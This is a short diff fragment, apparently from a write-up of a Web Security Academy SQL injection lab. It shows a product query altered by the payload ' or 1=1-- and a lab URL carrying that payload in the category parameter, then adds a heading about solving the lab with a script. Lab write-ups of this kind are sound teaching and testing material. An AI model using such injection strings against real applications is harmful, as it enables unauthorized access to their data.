@@ -36,3 +36,4 @@ SELECT * FROM products WHERE category = '' or 1=1--' AND released = 1
 ```
 https://0aa100aa03460e178277bf9200a400f4.web-security-academy.net/filter?category=' or 1=1--
 ```
+# Solving the lab with script
